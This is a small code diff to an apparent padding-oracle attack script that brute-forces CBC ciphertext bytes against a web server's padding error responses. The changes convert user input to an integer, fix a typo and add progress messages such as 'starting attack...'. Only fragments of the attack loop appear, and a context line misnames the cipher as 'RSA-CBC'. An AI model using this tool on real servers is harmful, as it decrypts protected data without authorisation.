@@ -49,7 +49,7 @@ if __name__ == "__main__":
 	
 	baseURL = input("Enter URL which will be followed by ciphertexts:\n")
 	cipher = input("Enter the ciphertext (hex-coded):\n")
-	SuccessCode = input("Enter the HTTP error code number which the server returns when it detects invalid padding.(ex. 404 etc):/n")
+	SuccessCode = int(input("Enter the HTTP error code number which the server returns when it detects invalid padding.(ex. 404 etc):\n"))
 
 	ciphertext = binascii.unhexlify(cipher)
 	cipherlist = []
@@ -63,8 +63,10 @@ if __name__ == "__main__":
 		print("Ciphertext is not correct length for RSA-CBC encrypted string.")
 		sys.exit()
 	
+	print("starting attack...")
 	padding = 0x00
 	if bAllExausive == False:
+		print("trying to find the correct padding")
 		# find out the padding number
 		tmpcipherlist = copy.deepcopy(cipherlist)
 		lastbyte = cipherlist[-2][-1]
@@ -93,7 +95,7 @@ if __name__ == "__main__":
 						bfirst = False
 					else:
 						continue
-			print("trying ",j, "/16 bytes of",i, "/"+str(len(cipherlist)-1)+" blocks")
+			print("trying ",j, "/16 byte of",i, "/"+str(len(cipherlist)-1)+" block")
 			for c in range(0xFF+1):
 				if bAllExausive == True:
 					if bfirst:             # skip c=0 and 1
